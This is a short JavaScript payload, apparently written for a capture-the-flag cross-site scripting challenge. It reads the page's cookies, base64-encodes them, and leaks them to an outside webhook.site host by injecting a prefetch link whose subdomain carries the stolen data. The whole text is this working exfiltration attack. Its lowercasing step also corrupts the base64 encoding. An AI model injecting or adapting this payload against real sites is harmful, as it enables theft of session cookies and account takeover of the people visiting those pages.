let flag = document.cookie;
// Encode flag to Base64, remove padding, and make it lowercase to be a valid DNS subdomain
let safeFlag = btoa(flag).replace(/=/g, '').toLowerCase();

// Inject a DNS prefetch link
let link = document.createElement('link');
link.rel = 'prefetch';

// Construct the URL so it becomes: http://[FLAG_BASE64].c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site
link.href = 'http://' + safeFlag + '.c28bdc7e-0993-4d8f-9a72-728714667c7f.webhook.site/';
document.head.appendChild(link);
